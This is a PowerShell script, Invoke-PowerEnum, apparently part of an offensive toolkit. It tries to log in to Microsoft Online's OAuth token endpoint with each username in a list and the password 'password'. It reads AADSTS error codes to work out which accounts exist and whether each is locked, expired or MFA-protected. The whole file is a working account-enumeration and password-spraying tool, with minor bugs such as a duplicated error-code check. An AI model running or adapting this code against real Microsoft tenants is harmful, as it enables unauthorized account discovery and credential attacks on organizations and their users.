function Invoke-PowerEnum {
<#
  .SYNOPSIS

    This module loops through usernames to validate accounts on MSOL

    PowerSniper Function: Invoke-PowerEnum
    Author: Josh Berry (@codewatchorg)
    License: BSD 3-Clause
    Required Dependencies: None
    Optional Dependencies: None

  .DESCRIPTION

    This module loops through usernames to spray against Microsoft Online to identify valid accounts.

  .PARAMETER userlist

    Path to a text file containing a list of users.  In many organizations, the username should be the email address.

  .EXAMPLE

    C:\PS> Invoke-PowerSniper -userlist users.txt

    Description
    -----------
    This command will attempt to authenticate against the MS Online using the usernames in the users.txt file.

  .LINK

    https://github.com/dafthack/MSOLSpray
#>

  # Do not report exceptions and set variables
  param($userlist);

  # Set encoding to UTF8
  $EncodingForm = [System.Text.Encoding]::UTF8;

  # Function to authenticate to Microsoft Online service
  function AuthMsOl {
    param($username, $password)
	
	# Set default status to failure
	$AuthStatus = "Failure";
	
	# Attempt a MS Online connection to the host
	Try {
	  # Create a web request
	  $BodyParams = @{'resource' = 'https://graph.windows.net'; 'client_id' = '1b730954-1685-4b74-9bfd-dac224a7b894' ; 'client_info' = '1' ; 'grant_type' = 'password' ; 'username' = $username ; 'password' = $password ; 'scope' = 'openid'}
          $PostHeaders = @{'Accept' = 'application/json'; 'Content-Type' =  'application/x-www-form-urlencoded'}
          $webrequest = Invoke-WebRequest https://login.microsoft.com/common/oauth2/token -Method Post -Headers $PostHeaders -Body $BodyParams -ErrorVariable RespErr 
	  
	  # If string contains 'command completed successfully' then the creds worked
	  If ($webrequest.StatusCode -eq "200") {
            Write-Host "Account exists and authentication to Microsoft Online succeeded: $username / $password";
	    $AuthStatus = "Success";
          }
	  
	} Catch {
          If ($RespErr -match "AADSTS50055") {
            Write-Host "Account exists but password is expired, however; authentication to service Microsoft Online succeeded: $username / $password";
	    $AuthStatus = "Success";
          } ElseIf ($RespErr -match "AADSTS50079") {
            Write-Host "Account exists but requires MFA, however; authentication to service Microsoft Online succeeded: $username / $password";
	    $AuthStatus = "Success";
          } ElseIf ($RespErr -match "AADSTS50076") {
            Write-Host "Account exists but requires MFA, however; authentication to service Microsoft Online succeeded: $username / $password";
	    $AuthStatus = "Success";
          } ElseIf ($RespErr -match "AADSTS50158") {
            Write-Host "Account exists but requires MFA, however; authentication to service Microsoft Online succeeded: $username / $password";
	    $AuthStatus = "Success";
          } ElseIf ($RespErr -match "AADSTS50053") {
            Write-Host "Account exists but is currently locked: $username";
	    $AuthStatus = "Success";
          } ElseIf ($RespErr -match "AADSTS50053") {
            Write-Host "Account exists but is disabled: $username";
	    $AuthStatus = "Success";
          } ElseIf ($RespErr -match "AADSTS50126") {
	    $AuthStatus = "Success";
          } Else {
	    $AuthStatus = "Failure";
          }
	}
	
	# Return the result

	return $AuthStatus;
  }
  
  # Load username list into a variable
  [System.Collections.ArrayList]$usernames = Get-Content $userlist;

  # Loop through passwords, combine with each user
  Get-Content $userlist | ForEach-Object -Process {
    $user = $_;

    # Set default account status
    $AccountStatus = "Failure";

    # Attempt authentication against Microsoft Online and check the status
    $AccountStatus = AuthMsOl -username $user -password 'password';
	  
    # If verbose mode is set, print off each connection attempt
    Write-Host "Connecting to https://login.microsoft.com using $user / password";

    # If enumeration succeeded, write out the success info
    If ($AccountStatus -eq "Success") {
      Write-Host "Valid account identified for Microsoft Online: $user";
    }
  }
}